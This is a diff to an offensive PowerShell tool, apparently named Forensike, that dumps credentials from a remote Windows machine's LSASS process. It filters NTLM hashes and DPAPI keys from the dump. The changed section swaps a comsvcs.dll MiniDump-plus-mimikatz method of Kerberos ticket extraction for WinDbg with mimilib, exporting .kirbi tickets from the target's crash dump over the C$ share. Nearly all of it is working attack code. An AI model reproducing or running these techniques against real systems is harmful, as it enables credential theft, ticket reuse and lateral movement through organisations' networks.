@@ -243,36 +243,22 @@ if ($confirmation -ne 'Y' -and $confirmation -ne 'y') {
 	# Displays hashes back
 	$EndHashes = Get-Content -Path "$dumpDir\hashes.txt" | Select-String -Pattern " Domain   :| Username :|NTLM     :| DPAPI    :" | Out-File -FilePath $dumpDir\forensike_results.txt
 	
-	## Kerberos Ticket Extractor
+	## Kerberos Ticket Extractor — directly from the crash dump via WinDBG + mimilib
+	## No comsvcs.dll minidump on the target, no mimikatz.exe dependency
 	if ($Kerberos) {
 		echo "====================================================================="
 		Write-Host -ForegroundColor White -BackgroundColor Darkred ">>>>>>>>>>[ STARTING KERBEROS TICKET EXTRACTION ]<<<<<<<<<<<"
 		echo "====================================================================="
 
-		# 1 - Get lsass PID on the remote machine via WMI
-		$lsassPID = (Get-WmiObject Win32_Process -ComputerName $target -Filter "Name='lsass.exe'").ProcessId
-		Write-Host -ForegroundColor Green "LSASS PID on $target : $lsassPID"
+		# Reuses $lsass_process (EPROCESS address) already extracted from the crash dump above
+		Write-Host -ForegroundColor Green "Reusing LSASS EPROCESS address: $lsass_process"
 
-		# 2 - Create a lsass minidump on the remote machine using the built-in comsvcs.dll MiniDump — no extra binary needed
-		$miniDumpRemotePath = "$ForensikeFolder\lsass_mini.dmp"
-		$miniDumpCmd = "rundll32 C:\Windows\System32\comsvcs.dll MiniDump $lsassPID $miniDumpRemotePath full"
-		Invoke-WmiMethod -class Win32_process -name Create -ArgumentList $miniDumpCmd -ComputerName $target | Out-Null
-		Write-Host "Waiting for minidump to complete..."
-		Start-Sleep -Seconds 15
-
-		# 3 - Copy the minidump back to the attacker machine via the existing PSDrive
-		$miniDumpLocalPath = "$dumpDir\lsass_mini.dmp"
-		Copy-Item "Forensike:\Windows\Temp\Forensike\lsass_mini.dmp" $miniDumpLocalPath
-		Write-Host -ForegroundColor Green "Minidump copied to $miniDumpLocalPath"
-
-		# 4 - Run mimikatz.exe locally against the minidump, export tickets as .kirbi files
 		$kirbiDir = "$dumpDir\kirbi"
 		New-Item -Path $kirbiDir -ItemType Directory -Force | Out-Null
-		# Resolve to absolute paths before Push-Location changes the working directory
-		$mimikatzAbsPath = (Resolve-Path "$toolsDir\mimikatz.exe").Path
-		$miniDumpAbsPath = (Resolve-Path $miniDumpLocalPath).Path
+
+		# WinDBG writes .kirbi files relative to its working directory — Push-Location controls that
 		Push-Location $kirbiDir
-		& $mimikatzAbsPath "sekurlsa::minidump $miniDumpAbsPath" "sekurlsa::tickets /export" "exit"
+		WinDbgX.exe -z "\\$target\C$\Windows\Temp\Forensike\Forensike.dmp" -c ".load $toolsDir\mimilib.dll" -c "!process 0 0 lsass.exe" -c ".process /r /p $lsass_process" -c "!mimilib.sekurlsa::tickets /export" -logo "$dumpDir\tickets.txt" -c "qq"
 		Pop-Location
 
 		$kirbiCount = (Get-ChildItem -Path $kirbiDir -Filter "*.kirbi" -ErrorAction SilentlyContinue | Measure-Object).Count
